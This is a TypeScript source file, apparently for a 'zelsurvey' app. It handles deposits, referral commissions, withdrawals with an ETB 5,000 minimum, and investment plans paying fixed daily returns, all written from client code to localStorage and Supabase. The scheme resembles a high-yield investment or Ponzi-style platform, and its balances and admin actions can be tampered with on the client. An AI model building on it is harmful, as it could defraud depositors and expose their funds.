        referrer.balance += rewardTotal;
        referrer.referralEarnings += rewardTotal;
        updateUser(referrer);
        safeDb(supabase.from('profiles').update({ balance: referrer.balance }).eq('id', referrer.id));
        safeDb(supabase.from('wallets').update({ balance: referrer.balance }).eq('user_id', referrer.id));

        addTransaction({
          userId: referrer.id,
          type: 'Referral Commission',
          amount: rewardTotal,
          description: awardReferralBonus
            ? `ETB 100 Referral Reward for inviting ${user.fullName}`
            : `5% referral commission from ${user.fullName}'s deposit`,
          status: 'Completed',
        });

        addNotification(referrer.id, {
          title: 'Referral Reward Credited! 🎉',
          message: awardReferralBonus
            ? `You earned ETB 100 because ${user.fullName} completed an approved deposit of ETB ${deposit.amount.toLocaleString()}!`
            : `You earned ETB ${rewardTotal.toLocaleString()} from ${user.fullName}'s verified deposit!`,
          type: 'referral',
        });

        // Update referral record status in Supabase
        safeDb(supabase.from('referrals').update({ status: 'Approved', reward_amount: rewardTotal }).eq('referred_user_id', user.id));
      }
    }

    updateUser(user);

    // Update profiles in Supabase
    try {
      await supabase.from('profiles').update({
        balance: user.balance,
        total_deposits: user.totalDeposits,
      }).eq('id', user.id);
    } catch (err) {
      console.warn('Supabase profile balance update notice:', err);
    }

    // Update wallets in Supabase
    try {
      await supabase.from('wallets').update({
        balance: user.balance,
        total_deposits: user.totalDeposits,
      }).eq('user_id', user.id);

      await supabase.from('wallets').update({
        balance: user.balance,
        total_deposits: user.totalDeposits,
      }).eq('id', user.id);
    } catch (err) {
      console.warn('Supabase wallet balance update notice:', err);
    }
  }

  // Update transaction status in local storage and Supabase
  const transactions = getTransactions();
  const txIndex = transactions.findIndex((t) => t.referenceId === depositId);
  if (txIndex !== -1) {
    transactions[txIndex].status = 'Completed';
    setItem(KEYS.TRANSACTIONS, transactions);
    try {
      await supabase.from('transactions').update({ status: 'Completed' }).eq('reference_id', depositId);
    } catch (err) {
      console.warn('Supabase transaction status update notice:', err);
    }
  } else {
    const newTx = {
      id: 'TXN-' + Math.floor(100000 + Math.random() * 900000),
      userId: deposit.userId,
      type: 'Deposit' as const,
      amount: deposit.amount,
      description: `Deposit approved via ${deposit.bankUsed} (${deposit.transactionRef})`,
      date: new Date().toISOString(),
      status: 'Completed' as const,
      referenceId: deposit.id,
    };
    addTransaction(newTx);
    try {
      await supabase.from('transactions').insert({
        id: newTx.id,
        user_id: deposit.userId,
        type: 'Deposit',
        amount: deposit.amount,
        description: newTx.description,
        date: newTx.date,
        status: 'Completed',
        reference_id: deposit.id,
      });
    } catch (err) {
      console.warn('Supabase transaction insert notice:', err);
    }
  }

  // Notify User
  addNotification(deposit.userId, {
    title: 'Deposit Approved! 🎉',
    message: `Your deposit of ETB ${deposit.amount.toLocaleString()} has been approved and credited to your wallet balance.`,
    type: 'deposit',
  });

  // Broadcast update & re-fetch from Supabase
  window.dispatchEvent(new Event('zelsurvey_storage_updated'));
  await fetchDataFromSupabase();

  return { success: true, message: `Deposit of ETB ${deposit.amount.toLocaleString()} approved and wallet credited.` };
}

// Admin: Reject Deposit
export async function rejectDeposit(depositId: string, adminNotes?: string): Promise<{ success: boolean; message: string }> {
  const deposits = getDeposits();
  const index = deposits.findIndex((d) => d.id === depositId);
  if (index === -1) return { success: false, message: 'Deposit request not found.' };

  const deposit = deposits[index];
  deposit.status = 'Rejected';
  deposit.adminNotes = adminNotes || 'Proof verification failed or invalid reference.';
  deposit.reviewedAt = new Date().toISOString();
  deposits[index] = deposit;
  setItem(KEYS.DEPOSITS, deposits);

  // Update in Supabase
  try {
    await supabase.from('deposits').update({
      status: 'Rejected',
      admin_notes: deposit.adminNotes,
      reviewed_at: deposit.reviewedAt,
    }).eq('id', depositId);
  } catch (err) {
    console.warn('Supabase deposit rejection update notice:', err);
  }

  // Update transaction log
  const transactions = getTransactions();
  const txIndex = transactions.findIndex((t) => t.referenceId === depositId);
  if (txIndex !== -1) {
    transactions[txIndex].status = 'Failed';
    setItem(KEYS.TRANSACTIONS, transactions);
    try {
      await supabase.from('transactions').update({ status: 'Failed' }).eq('reference_id', depositId);
    } catch (err) {
      console.warn('Supabase transaction update notice:', err);
    }
  }

  // Notify User
  addNotification(deposit.userId, {
    title: 'Deposit Verification Failed ❌',
    message: `Your deposit of ETB ${deposit.amount.toLocaleString()} was rejected: ${deposit.adminNotes}`,
    type: 'deposit',
  });

  // Broadcast update & re-fetch from Supabase
  window.dispatchEvent(new Event('zelsurvey_storage_updated'));
  await fetchDataFromSupabase();

  return { success: true, message: 'Deposit request rejected.' };
}

// Admin: Manual Trigger Referral Reward (ETB 100)
export function triggerReferralReward(referredUserId: string): { success: boolean; message: string } {
  const users = getUsers();
  const refUser = users.find((u) => u.id === referredUserId);
  if (!refUser) return { success: false, message: 'Referred user profile not found.' };

  if (refUser.referralRewardPaid) {
    return { success: false, message: 'Referral reward (ETB 100) has already been issued for this user.' };
  }

  if (!refUser.referredBy) {
    return { success: false, message: 'This user was not registered via a referral code.' };
  }

  const referrer = users.find((u) => u.referralCode.toLowerCase() === refUser.referredBy?.toLowerCase());
  if (!referrer) {
    return { success: false, message: 'Referrer profile not found.' };
  }

  // Credit ETB 100 reward
  refUser.referralRewardPaid = true;
  updateUser(refUser);

  referrer.balance += 100;
  referrer.referralEarnings += 100;
  updateUser(referrer);

  addTransaction({
    userId: referrer.id,
    type: 'Referral Commission',
    amount: 100,
    description: `ETB 100 Referral Reward for inviting ${refUser.fullName}`,
    status: 'Completed',
  });

  addNotification(referrer.id, {
    title: 'Referral Reward Credited! 🎉',
    message: `You earned ETB 100 because ${refUser.fullName} was verified!`,
    type: 'referral',
  });

  safeDb(supabase.from('referrals').update({ status: 'Approved', reward_amount: 100 }).eq('referred_user_id', referredUserId));

  return { success: true, message: `ETB 100 referral reward successfully credited to ${referrer.fullName}.` };
}

// Withdrawal Actions
export function getWithdrawals(): WithdrawalRequest[] {
  return getItem<WithdrawalRequest[]>(KEYS.WITHDRAWALS, []);
}

export function getUserWithdrawals(userId: string): WithdrawalRequest[] {
  return getWithdrawals().filter((w) => w.userId === userId);
}

export function requestWithdrawal(data: {
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  method: string;
  accountInfo: string;
  accountName?: string;
}): { success: boolean; message: string; withdrawal?: WithdrawalRequest } {
  const user = getUserById(data.userId);
  if (!user) return { success: false, message: 'User profile not found.' };

  const settings = getPlatformSettings();
  const minWithdrawal = settings.minWithdrawalAmount || 5000;

  if (user.balance < minWithdrawal) {
    return {
      success: false,
      message: `Your available balance must be at least ETB ${minWithdrawal.toLocaleString()} before you can request a withdrawal.`,
    };
  }

  if (data.amount < minWithdrawal) {
    return {
      success: false,
      message: `Minimum withdrawal amount is ETB ${minWithdrawal.toLocaleString()}.`,
    };
  }

  if (data.amount > user.balance) {
    return { success: false, message: 'Insufficient Balance. Your wallet balance is less than the requested withdrawal amount.' };
  }

  if (data.amount <= 0) {
    return { success: false, message: 'Invalid withdrawal amount.' };
  }

  // Deduct balance instantly
  user.balance -= data.amount;
  user.totalWithdrawals += data.amount;
  updateUser(user);

  const withdrawals = getWithdrawals();
  const newWithdrawal: WithdrawalRequest = {
    id: 'WTH-' + Math.floor(100000 + Math.random() * 900000),
    userId: data.userId,
    userName: data.userName,
    userEmail: data.userEmail,
    amount: data.amount,
    method: data.method,
    accountInfo: data.accountInfo,
    accountName: data.accountName,
    date: new Date().toISOString(),
    status: 'Pending',
  };

  withdrawals.unshift(newWithdrawal);
  setItem(KEYS.WITHDRAWALS, withdrawals);

  // Push to Supabase withdrawals
  safeDb(supabase.from('withdrawals').insert(mapWithdrawalToDb(newWithdrawal)));

  // Log transaction
  addTransaction({
    userId: data.userId,
    type: 'Withdrawal',
    amount: data.amount,
    description: `Withdrawal request to ${data.method} (${data.accountInfo})`,
    status: 'Pending',
    referenceId: newWithdrawal.id,
  });

  // Notify user
  addNotification(data.userId, {
    title: 'Withdrawal Request Submitted',
    message: `Your withdrawal request of ETB ${data.amount.toLocaleString()} to ${data.method} is pending processing.`,
    type: 'withdrawal',
  });

  return { success: true, message: 'Withdrawal request submitted successfully!', withdrawal: newWithdrawal };
}

// Admin Process Withdrawal
export async function processWithdrawal(withdrawalId: string, action: 'approve' | 'reject', notes?: string): Promise<{ success: boolean; message: string }> {
  const withdrawals = getWithdrawals();
  const index = withdrawals.findIndex((w) => w.id === withdrawalId);
  if (index === -1) return { success: false, message: 'Withdrawal request not found.' };

  const withdrawal = withdrawals[index];
  const user = getUserById(withdrawal.userId);

  if (action === 'approve') {
    withdrawal.status = 'Approved';
    withdrawal.adminNotes = notes || 'Withdrawal processed successfully.';
    withdrawal.reviewedAt = new Date().toISOString();

    if (user) {
      updateUser(user);
      safeDb(supabase.from('profiles').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('id', user.id));
      safeDb(supabase.from('wallets').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('user_id', user.id));
      safeDb(supabase.from('wallets').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('id', user.id));
    }

    addNotification(withdrawal.userId, {
      title: 'Withdrawal Processed 💸',
      message: `Your withdrawal of ETB ${withdrawal.amount.toLocaleString()} has been processed and transferred.`,
      type: 'withdrawal',
    });
  } else {
    withdrawal.status = 'Rejected';
    withdrawal.adminNotes = notes || 'Account details mismatch or verification required.';
    withdrawal.reviewedAt = new Date().toISOString();

    // Refund user balance
    if (user) {
      user.balance += withdrawal.amount;
      user.totalWithdrawals = Math.max(0, user.totalWithdrawals - withdrawal.amount);
      updateUser(user);
      safeDb(supabase.from('profiles').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('id', user.id));
      safeDb(supabase.from('wallets').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('user_id', user.id));
      safeDb(supabase.from('wallets').update({ balance: user.balance, total_withdrawals: user.totalWithdrawals }).eq('id', user.id));
    }

    addNotification(withdrawal.userId, {
      title: 'Withdrawal Rejected (Refunded)',
      message: `Your withdrawal of ETB ${withdrawal.amount.toLocaleString()} was rejected and refunded to your balance: ${withdrawal.adminNotes}`,
      type: 'withdrawal',
    });
  }

  withdrawals[index] = withdrawal;
  setItem(KEYS.WITHDRAWALS, withdrawals);

  // 1. Immediately update withdrawals table status in Supabase
  try {
    await supabase.from('withdrawals').update({
      status: withdrawal.status,
      admin_notes: withdrawal.adminNotes,
      reviewed_at: withdrawal.reviewedAt,
    }).eq('id', withdrawalId);
  } catch (err) {
    console.warn('Supabase withdrawal update notice:', err);
  }

  // 2. Update matching transaction record in transactions table
  const newTxStatus = action === 'approve' ? 'Completed' : 'Failed';
  const transactions = getTransactions();
  let txUpdated = false;

  for (let i = 0; i < transactions.length; i++) {
    const t = transactions[i];
    if (
      t.referenceId === withdrawalId ||
      t.referenceId === withdrawal.id ||
      (t.userId === withdrawal.userId && t.type === 'Withdrawal' && Math.abs(t.amount - withdrawal.amount) < 0.01 && t.status === 'Pending')
    ) {
      transactions[i].status = newTxStatus;
      txUpdated = true;
    }
  }

  if (txUpdated) {
    setItem(KEYS.TRANSACTIONS, transactions);
  }

  try {
    await supabase.from('transactions').update({ status: newTxStatus }).eq('reference_id', withdrawalId);
    await supabase.from('transactions').update({ status: newTxStatus }).eq('reference_id', withdrawal.id);
  } catch (err) {
    console.warn('Supabase transaction status update notice:', err);
  }

  // 3. Immediately broadcast & trigger re-fetch from Supabase
  window.dispatchEvent(new Event('zelsurvey_storage_updated'));
  await fetchDataFromSupabase();

  return { success: true, message: `Withdrawal request ${action === 'approve' ? 'approved' : 'rejected'}.` };
}

// Investment Plan Actions
export function getPlans(): InvestmentPlan[] {
  const stored = getItem<InvestmentPlan[]>(KEYS.PLANS, DEFAULT_PLANS);
  const updated = stored.map((p) => {
    const defaultMatch = DEFAULT_PLANS.find((dp) => dp.id === p.id);
    if (defaultMatch) {
      return {
        ...p,
        minInvestment: defaultMatch.minInvestment,
        dailyEarnings: defaultMatch.dailyEarnings,
        dailyRoiPercent: defaultMatch.dailyRoiPercent,
        totalReturnPercent: defaultMatch.totalReturnPercent,
        durationDays: defaultMatch.durationDays,
      };
    }
    return p;
  });
  return updated;
}

export function updatePlans(plans: InvestmentPlan[]): void {
  setItem(KEYS.PLANS, plans);
}

// Automatic Daily Earnings Engine
export function processDailyEarnings(): void {
  const investments = getItem<UserInvestment[]>(KEYS.INVESTMENTS, []);
  if (investments.length === 0) return;

  const users = getUsers();
  let investmentsUpdated = false;
  let usersUpdated = false;

  const now = Date.now();
  const DAY_IN_MS = 24 * 60 * 60 * 1000;

  for (let i = 0; i < investments.length; i++) {
    const inv = investments[i];
    if (inv.status !== 'Active') continue;

    const startTime = new Date(inv.startDate).getTime();
    if (isNaN(startTime) || startTime > now) continue;

    const elapsedMs = now - startTime;
    const fullDaysPassed = Math.floor(elapsedMs / DAY_IN_MS);
    const targetDaysPaid = Math.min(inv.durationDays, fullDaysPassed);

    const pendingDays = targetDaysPaid - inv.daysElapsed;

    if (pendingDays > 0) {
      investmentsUpdated = true;
      const payoutAmount = pendingDays * inv.dailyEarnings;
      const oldDaysElapsed = inv.daysElapsed;
      inv.daysElapsed = targetDaysPaid;

      if (inv.daysElapsed >= inv.durationDays) {
        inv.status = 'Completed';
      }

      const userIndex = users.findIndex((u) => u.id === inv.userId);
      if (userIndex !== -1) {
        usersUpdated = true;
        users[userIndex].balance += payoutAmount;

        if (inv.status === 'Completed') {
          users[userIndex].activePlansCount = Math.max(0, users[userIndex].activePlansCount - 1);
        }

        // Add transaction log for each day paid
        for (let d = 1; d <= pendingDays; d++) {
          const currentDayNumber = oldDaysElapsed + d;
          addTransaction({
            userId: inv.userId,
            type: 'Daily Earnings',
            amount: inv.dailyEarnings,
            description: `Daily Earnings payout for ${inv.planName} Plan (Day ${currentDayNumber}/${inv.durationDays})`,
            status: 'Completed',
            referenceId: `${inv.id}-day-${currentDayNumber}`,
          });
        }

        // Send notification
        if (inv.status === 'Completed') {
          addNotification(inv.userId, {
            title: 'Investment Plan Completed! 🏆',
            message: `Your ${inv.planName} Plan has finished all ${inv.durationDays} days of daily returns! Total returned: ETB ${inv.totalReturn.toLocaleString()}.`,
            type: 'investment',
          });
        } else {
          addNotification(inv.userId, {
            title: 'Daily Earnings Credited! 💸',
            message: `ETB ${payoutAmount.toLocaleString()} daily earnings credited from your ${inv.planName} Plan (${pendingDays} day${pendingDays > 1 ? 's' : ''}).`,
            type: 'investment',
          });
        }
      }
    }
  }

  if (usersUpdated) {
    setItem(KEYS.USERS, users);
    users.forEach((u) => {
      safeDb(
        supabase
          .from('profiles')
          .update({
            balance: u.balance,
            active_plans_count: u.activePlansCount,
          })
          .eq('id', u.id)
      );
    });
  }

  if (investmentsUpdated) {
    setItem(KEYS.INVESTMENTS, investments);
    investments.forEach((inv) => {
      safeDb(
        supabase
          .from('investments')
          .update({
            days_elapsed: inv.daysElapsed,
            status: inv.status,
          })
          .eq('id', inv.id)
      );
    });
  }
}

export function getUserInvestments(userId: string): UserInvestment[] {
  processDailyEarnings();
  return getItem<UserInvestment[]>(KEYS.INVESTMENTS, []).filter((inv) => inv.userId === userId);
}

export function purchaseInvestmentPlan(userId: string, planId: string): { success: boolean; message: string } {
  const user = getUserById(userId);
  if (!user) return { success: false, message: 'User account not found.' };

  const plans = getPlans();
  const plan = plans.find((p) => p.id === planId);
  if (!plan) return { success: false, message: 'Investment plan not found.' };

  if (user.balance < plan.minInvestment) {
    return { success: false, message: 'Insufficient Balance. Please deposit funds first.' };
  }

  // Deduct investment amount
  user.balance -= plan.minInvestment;
  user.activePlansCount += 1;
  updateUser(user);

  const startDate = new Date();
  const endDate = new Date(startDate.getTime() + plan.durationDays * 24 * 60 * 60 * 1000);
  
  const dailyEarnings = plan.dailyEarnings || (plan.minInvestment * plan.dailyRoiPercent) / 100;
  const totalReturn = plan.minInvestment + (dailyEarnings * plan.durationDays);

  const newInvestment: UserInvestment = {
    id: 'INV-' + Math.floor(100000 + Math.random() * 900000),
    userId,
    planId: plan.id,
    planName: plan.name,
    amount: plan.minInvestment,
    dailyEarnings,
    totalReturn,
    startDate: startDate.toISOString(),
    endDate: endDate.toISOString(),
    durationDays: plan.durationDays,
    daysElapsed: 0,
    status: 'Active',
  };

  const investments = getItem<UserInvestment[]>(KEYS.INVESTMENTS, []);
  investments.unshift(newInvestment);
  setItem(KEYS.INVESTMENTS, investments);

  // Push to Supabase investments table
  safeDb(supabase.from('investments').insert(mapInvestmentToDb(newInvestment)));

  // Log transaction
  addTransaction({
    userId,
    type: 'Investment',
    amount: plan.minInvestment,
    description: `Purchased ${plan.name} Investment Plan`,
    status: 'Completed',
    referenceId: newInvestment.id,
  });

  // Notify user
  addNotification(userId, {
    title: 'Investment Purchased! 🚀',
    message: `You successfully subscribed to the ${plan.name} Plan with ETB ${plan.minInvestment.toLocaleString()}.`,
    type: 'investment',
  });

  processDailyEarnings();

  return { success: true, message: `Successfully invested ETB ${plan.minInvestment.toLocaleString()} in ${plan.name} Plan!` };
}

// Transaction Logging
export function getTransactions(): Transaction[] {
  processDailyEarnings();
  return getItem<Transaction[]>(KEYS.TRANSACTIONS, []);
}

export function getUserTransactions(userId: string): Transaction[] {
  return getTransactions().filter((t) => t.userId === userId);
}

export function addTransaction(data: Omit<Transaction, 'id' | 'date'>): Transaction {
  const transactions = getTransactions();
  const tx: Transaction = {
    ...data,
    id: 'TX-' + Math.floor(100000 + Math.random() * 900000),
    date: new Date().toISOString(),
  };

  transactions.unshift(tx);
  setItem(KEYS.TRANSACTIONS, transactions);

  // Push to Supabase transactions table
  safeDb(supabase.from('transactions').insert(mapTransactionToDb(tx)));

  return tx;
}

// Notification System
export function getNotifications(userId: string): NotificationItem[] {
  return getItem<NotificationItem[]>(KEYS.NOTIFICATIONS, []).filter((n) => n.userId === userId);
}

export function addNotification(userId: string, data: Omit<NotificationItem, 'id' | 'userId' | 'date' | 'read'>): NotificationItem {
  const notifications = getItem<NotificationItem[]>(KEYS.NOTIFICATIONS, []);
  const newItem: NotificationItem = {
    ...data,
    id: 'NTF-' + Math.floor(100000 + Math.random() * 900000),
    userId,
    date: new Date().toISOString(),
    read: false,
  };

  notifications.unshift(newItem);
  setItem(KEYS.NOTIFICATIONS, notifications);

  // Push to Supabase notifications table
  safeDb(supabase.from('notifications').insert(mapNotificationToDb(newItem)));

  return newItem;
}

export function markNotificationAsRead(notificationId: string): void {
  const notifications = getItem<NotificationItem[]>(KEYS.NOTIFICATIONS, []);
  const index = notifications.findIndex((n) => n.id === notificationId);
  if (index !== -1) {
    notifications[index].read = true;
    setItem(KEYS.NOTIFICATIONS, notifications);
    safeDb(supabase.from('notifications').update({ read: true }).eq('id', notificationId));
  }
}

export function markAllNotificationsAsRead(userId: string): void {
  const notifications = getItem<NotificationItem[]>(KEYS.NOTIFICATIONS, []);
  const updated = notifications.map((n) => (n.userId === userId ? { ...n, read: true } : n));
  setItem(KEYS.NOTIFICATIONS, updated);
  safeDb(supabase.from('notifications').update({ read: true }).eq('user_id', userId));
}

// Seed Demo Data Helper
export function seedDemoDataForTesting(userId: string): { success: boolean; message: string } {
  const user = getUserById(userId);
  if (!user) return { success: false, message: 'Please log in first.' };

  createDepositRequest({
    userId: user.id,
    userName: user.fullName,
    userEmail: user.email,
    amount: 5000,
    bankUsed: 'Bank Transfer',
    transactionRef: 'TXN-98234199',
    paymentProofUrl: 'https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?auto=format&fit=crop&w=600&q=80',
    notes: 'Demo receipt submitted for testing verification.',
  });

  return { 
    success: true, 
    message: 'Demo deposit request of ETB 5,000 submitted! Switch to Admin Panel to approve it and credit your wallet balance.' 
  };
}
